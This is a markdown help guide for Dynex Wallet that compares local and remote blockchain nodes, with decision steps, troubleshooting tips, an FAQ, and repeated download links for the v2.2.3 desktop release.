<div align="center">

[![Dynex Wallet](https://img.shields.io/badge/Dynex_Wallet-v2.2.3-22C3E6?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![Platforms](https://img.shields.io/badge/Windows%20%7C%20macOS%20%7C%20Linux-desktop-1E6FEB?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![License](https://img.shields.io/badge/license-ISC-0B1220?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet) [![Website](https://img.shields.io/badge/dynexwallet.org-visit-22C3E6?style=for-the-badge)](https://dynexwallet.org/)

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

</div>

> [!NOTE]
> Part of the [Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme). Official site: [dynexwallet.org](https://dynexwallet.org/) - current release: [Dynex Wallet v2.2.3](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

# Dynex Remote Node vs Local Node: Which Should You Use?

**A local node gives Dynex Wallet its own full copy of the blockchain to verify everything independently, while a remote node lets you skip that download and sync almost instantly by trusting someone else's already-running node -- most casual users are better off starting with a remote node and switching to local later if they want it.**

## You'll see this if...

You are setting up Dynex Wallet for the first time, or troubleshooting sync problems, and you notice a network settings option letting you choose between running your own local node or connecting to a remote one. You are not sure which to pick, what the tradeoffs are, or whether switching will affect your funds, transaction history, or privacy.

This choice also comes up as a troubleshooting step: if your local node is misbehaving, pointing the wallet at a remote node temporarily is a quick way to tell whether the problem is with your own machine's connectivity or something else entirely.

## Why it happens

Dynex, like other CryptoNote-based cryptocurrencies, relies on a peer-to-peer network of nodes that each hold and verify the full transaction history. A wallet needs to talk to at least one node to know the current blockchain state, check balances, and broadcast new transactions. There are two ways to get that connection:

- **Local node**: Dynex Wallet downloads and verifies the entire blockchain on your own computer, becoming a full participant in the network. This takes real disk space (5 GB minimum, growing over time), CPU during sync, and a stable connection, but means you are not trusting any third party's version of events -- you verify everything yourself.
- **Remote node**: Your wallet connects to someone else's already-synced node over the network and asks it for the data it needs. You skip the local download and verification work entirely, trading a small amount of trust in that remote node's honesty and availability for a much faster, lighter setup.

Neither option changes who controls your funds. Your private keys never leave your device in either mode; the node choice only affects how your wallet learns about the blockchain's current state and submits transactions.

## Step-by-step fix

Use this as a decision guide rather than a problem to "fix":

1. **If you want the fastest possible setup**, especially on a laptop, a machine with limited disk space, or a network you do not fully control, choose a remote node from the wallet's network settings. You will typically be up and running within moments instead of waiting through a [first sync](./dynex-wallet-slow-first-sync.md).
2. **If you want maximum independence and verification**, choose a local node. This is the more traditional self-custody approach: you are not relying on anyone else's node telling you the truth about balances or the chain state.
3. **If you are experiencing connectivity problems**, such as [no connections showing up](./dynex-wallet-no-connections.md) or a [sync stuck at a block](./dynex-wallet-sync-stuck-at-block.md), switch to a remote node temporarily as a diagnostic step. If things work immediately on a remote node, your local node setup (likely a port or firewall issue) is the culprit.
4. **To switch**, open the wallet's network or node settings, in recent builds found under a connection or preferences menu, and either toggle "use remote node" and enter or select a node address, or toggle back to local node mode.
5. **If using a local node**, make sure [port 17336 is open](./dynex-wallet-firewall-port-17336.md) for smooth peer connectivity.
6. **If using a remote node**, use a node you trust or one published through [the remote nodes documentation](https://dynexwallet.org/docs/remote-nodes), since a dishonest or malicious remote node could in theory show you false information about incoming transactions (though it still cannot move your funds without your keys).
7. **Either way, update to Dynex Wallet v2.2.3**, from the [download page](https://dynexwallet.org/download) or [GitHub release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3), which added a cleaner remote node option alongside the existing local node path, making it easier to switch between the two without reinstalling or reconfiguring everything from scratch.

## If that didn't work

If you switch to a remote node and still see no activity, the node itself may be offline or unreachable -- try a different remote node address. If every remote node you try fails, the problem is more likely your general internet connectivity or a firewall blocking the wallet's network access entirely, independent of node choice.

If you run a local node and it never seems to catch up no matter what you try, see [slow first sync](./dynex-wallet-slow-first-sync.md) and [sync stuck at a block](./dynex-wallet-sync-stuck-at-block.md) for dedicated troubleshooting, or just switch permanently to a remote node and skip local syncing altogether.

## Prevent it next time

If you know in advance you will be moving between networks often, or you are setting the wallet up on a machine with limited resources, default to a remote node from the start rather than discovering the hard way that local sync is impractical for your situation. If independence and self-verification matter more to you, budget the time and disk space for a proper local sync once, ideally on a stable wired connection, and keep the wallet updated so future chain growth does not catch your available disk space by surprise.

## FAQ

### Does a remote node ever see my private keys?
No, your keys and signing happen entirely on your own device. A remote node only provides blockchain data and relays your already-signed transactions.

### Can a malicious remote node steal my DNX?
No, but it could theoretically give you misleading information (for example, claiming a payment has not arrived when it has), so use a node you trust.

### Is switching between local and remote nodes reversible?
Yes, you can switch back and forth at any time from the wallet's network settings without affecting your wallet file or balance.

### Which option does Dynex Wallet default to?
Behavior can vary by build and prior settings, so check your network preferences to confirm which mode you are currently using.

### Does using a remote node save disk space long-term?
Yes, since you never download or store the full blockchain locally, your disk usage stays minimal regardless of how large the chain grows.

### Is a local node required for mining?
Mining pool payouts go to your wallet address regardless of node choice; you do not need to run a local node to receive mining income.

---

## The lasting fix: install Dynex Wallet v2.2.3

> [!TIP]
> Most problems in this guide are handled by the current desktop release. Download it from the official release page, then open your existing wallet.

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

Read the full install walkthrough on the [Dynex Wallet download page](https://dynexwallet.org/download) or see the [sync and network guides on dynexwallet.org](https://dynexwallet.org/troubleshooting/sync-stalled).

> [!WARNING]
> **Nobody from Dynex will ever ask for your recovery seed or private keys.** Only download from the [official v2.2.3 release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

## Related Dynex Wallet guides

| Keep reading |
|---|
| [Dynex Wallet Sync Stuck at a Block](./dynex-wallet-sync-stuck-at-block.md) |
| [Dynex Wallet's Slow First Sync](./dynex-wallet-slow-first-sync.md) |
| [Dynex Wallet Shows No Connections](./dynex-wallet-no-connections.md) |
| [Dynex many tiny mining payouts](./dynex-many-tiny-mining-payouts.md) |
| [All Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme) |
